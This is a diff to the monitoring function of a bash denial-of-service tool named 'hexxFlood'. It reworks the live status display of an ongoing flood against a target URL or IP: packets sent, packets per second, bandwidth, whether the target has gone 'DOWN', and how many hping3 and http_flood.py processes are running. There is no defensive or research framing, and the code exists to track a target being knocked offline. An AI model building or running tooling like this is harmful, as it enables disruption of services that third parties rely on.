@@ -449,75 +449,56 @@ monitor_attack() {
     ATTACK_START_TIME=$start_time
     ATTACK_INITIAL_PACKETS=$initial_packets
 
+    # Duration label for the header
+    local dur_disp="∞"; [ "$duration" -gt 0 ] && dur_disp="${duration}s"
+
+    # ---- streaming header: printed ONCE; the whole run scrolls below it ----
+    show_banner
+    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
+    echo -e "${WHITE}                 ☢️  hexxFlood LIVE STREAM  ☢️${NC}"
+    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
+    if [ "$TARGET_TYPE" = "url" ]; then
+        echo -e "${YELLOW}📍 Target:${NC} $URL  ${CYAN}(${TARGET})${NC}"
+    else
+        echo -e "${YELLOW}📍 Target:${NC} $TARGET"
+    fi
+    echo -e "${YELLOW}🧵 Threads:${NC} $THREADS   ${YELLOW}📦 Packet:${NC} ${PACKET_SIZE}B   ${YELLOW}🕒 Duration:${NC} ${dur_disp}"
+    echo -e "${RED}Press Ctrl+C to stop — the full run scrolls below${NC}"
+    echo -e "${CYAN}────────────────────────────────────────────────────────────────${NC}"
+
     while true; do
         if [ $duration -gt 0 ]; then
-            local current_time=$(date +%s)
-            local elapsed=$((current_time - start_time))
-            if [ $elapsed -ge $duration ]; then
-                echo -e "${YELLOW}⏱️ Attack duration completed${NC}"
+            local elapsed_chk=$(( $(date +%s) - start_time ))
+            if [ $elapsed_chk -ge $duration ]; then
+                echo -e "${YELLOW}⏱️  Attack duration completed${NC}"
                 break
             fi
         fi
-        
+
         local current_packets=$(get_packet_count)
         local elapsed=$(( $(date +%s) - start_time ))
         local packets_sent=$((current_packets - initial_packets))
         local pps=0
         [ $elapsed -gt 0 ] && pps=$((packets_sent / elapsed))
-        
-        clear
-        show_banner
-        echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
-        echo -e "${WHITE}                    ☢️  hexxFlood STATUS  ☢️${NC}"
-        echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
-        echo ""
-        
-        if [ "$TARGET_TYPE" = "url" ]; then
-            echo -e "${YELLOW}📍 TARGET URL:${NC} $URL"
-            echo -e "${YELLOW}📍 TARGET IP:${NC} $TARGET"
-        else
-            echo -e "${YELLOW}📍 TARGET:${NC} $TARGET"
-        fi
-        [ $duration -gt 0 ] && echo -e "${YELLOW}⏱️ Time Remaining:${NC} $((duration - elapsed))s"
-        echo -e "${YELLOW}⏱️ Elapsed Time:${NC} ${elapsed}s"
-        echo ""
-        
-        echo -e "${YELLOW}📊 PACKET STATISTICS:${NC}"
-        echo -e "   Total Packets Sent: ${GREEN}$(printf "%'d" $packets_sent)${NC}"
-        echo -e "   Packets Per Second: ${GREEN}$(printf "%'d" $pps)${NC}"
-        echo ""
-        
-        PING_RESULT=$(ping -c 1 $TARGET 2>/dev/null | grep -o "time=[0-9.]* ms" || echo "💀 TARGET UNRESPONSIVE!")
-        echo -e "${YELLOW}📊 Target Response:${NC} $PING_RESULT"
-        echo ""
-        
-        HPING_COUNT=$(pgrep -c hping3 2>/dev/null || echo 0)
-        HTTP_COUNT=$(pgrep -cf http_flood.py 2>/dev/null || echo 0)
-        echo -e "${YELLOW}🔢 Active Processes:${NC}"
-        echo "   hping3: $HPING_COUNT"
-        echo "   HTTP: $HTTP_COUNT"
-        echo ""
-        
-        CPU=$(top -bn1 | head -5 | grep Cpu | awk '{print $2}')
-        echo -e "${YELLOW}💻 CPU Usage:${NC} ${CPU:-0}%"
-        echo ""
-        
-        MEM=$(free -h | grep Mem | awk '{print $3 "/" $2}')
-        echo -e "${YELLOW}🧠 Memory:${NC} $MEM used"
-        echo ""
-        
-        if [ $pps -gt 0 ]; then
-            local bandwidth_mbps=$(( (pps * PACKET_SIZE * 8) / 1000000 ))
-            echo -e "${YELLOW}🌊 Bandwidth:${NC} ${bandwidth_mbps} Mbps"
-            echo ""
-        fi
-        
-        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-        echo -e "${WHITE}⏱️ Last Updated: $(date +%H:%M:%S)${NC}"
-        echo -e "${RED}Press Ctrl+C to stop${NC}"
+        local bw=0
+        [ $pps -gt 0 ] && bw=$(( (pps * PACKET_SIZE * 8) / 1000000 ))
+
+        local resp=$(ping -c 1 -W 1 $TARGET 2>/dev/null | grep -o "time=[0-9.]* ms" | head -1)
+        if [ -z "$resp" ]; then resp="${RED}DOWN${NC}"; else resp="${GREEN}${resp}${NC}"; fi
+
+        local hcount=$(pgrep -c hping3 2>/dev/null || echo 0)
+        local httpc=$(pgrep -cf http_flood.py 2>/dev/null || echo 0)
+        local cpu=$(top -bn1 | grep -m1 Cpu | awk '{print $2}')
+        local mem=$(free -h | awk '/Mem/{print $3"/"$2}')
+
+        local rem=""
+        [ $duration -gt 0 ] && rem="  ${YELLOW}rem${NC} $((duration - elapsed))s"
+
+        # One streaming line per tick -> the whole run scrolls by
+        echo -e "${CYAN}[$(date +%H:%M:%S)]${NC} ${YELLOW}t${NC} ${elapsed}s${rem}  ${YELLOW}pkts${NC} $(printf "%'d" $packets_sent)  ${YELLOW}pps${NC} $(printf "%'d" $pps)  ${YELLOW}bw${NC} ${bw}Mbps  ${YELLOW}resp${NC} ${resp}  ${YELLOW}cpu${NC} ${cpu:-0}%  ${YELLOW}mem${NC} ${mem}  ${YELLOW}proc${NC} h:${hcount} w:${httpc}"
+
         sleep 2
     done
-
     # Duration finished: reuse the same clean, structured shutdown as Ctrl+C
     cleanup
 }
